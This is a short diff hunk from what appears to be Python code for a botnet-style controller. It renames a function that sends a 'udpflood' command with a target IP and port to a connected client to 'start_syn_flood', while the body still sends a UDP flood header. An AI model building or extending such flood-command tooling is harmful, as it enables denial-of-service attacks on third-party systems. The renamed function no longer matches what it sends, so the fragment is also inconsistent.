@@ -22,7 +22,7 @@ async def send_file(client_writer:asyncio.StreamWriter, filepath, filename, exte
     finally:
         print("File sent succesfully")
 
-async def start_udp_flood(client_writer:asyncio.StreamWriter, ip_addr:str, port:int):
+async def start_syn_flood(client_writer:asyncio.StreamWriter, ip_addr:str, port:int):
     try:
         header = f"udpflood {ip_addr} {port}" #Send a header, that explains it's a udpflood and gives some args to use
         client_writer.write(header.encode())
